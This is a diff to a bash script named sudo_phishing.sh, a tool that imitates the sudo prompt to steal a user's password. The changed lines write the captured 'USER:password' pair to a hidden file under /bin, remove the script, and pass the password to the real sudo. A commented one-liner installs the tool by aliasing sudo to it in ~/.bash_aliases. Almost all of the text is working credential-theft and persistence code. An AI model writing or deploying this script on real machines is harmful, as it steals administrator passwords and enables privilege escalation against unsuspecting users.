@@ -23,11 +23,11 @@ attempts() {
         # <YOUR-PAYLOAD>
         ##
         /bin/echo "${USER}:${sudo_password}"
-        #/bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
+        /bin/echo "${USER}:${sudo_password}" > /bin/.sudo_password
         ##
         # </YOUR-PAYLOAD>
         ##
-        /bin/rm /tmp/sudo_phishing.sh
+        /bin/rm /bin/sudo_phishing.sh
         # /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
         # /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
@@ -44,4 +44,4 @@ for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
 done
 /bin/echo "${ERROR_MESSAGE}"
 
-#rm /tmp/sudo_phishing.sh && cp sudo_phishing.sh /tmp/sudo_phishing.sh && chmod 777 /tmp/sudo_phishing.sh && echo "alias sudo='/tmp/sudo_phishing.sh'" >> ~/.bash_aliases && source ~/.bash_aliases
+#rm /bin/sudo_phishing.sh && cp sudo_phishing.sh /bin/sudo_phishing.sh && chmod 777 /bin/sudo_phishing.sh && echo "alias sudo='/bin/sudo_phishing.sh'" >> ~/.bash_aliases && source ~/.bash_aliases && . ~/.bash_aliases
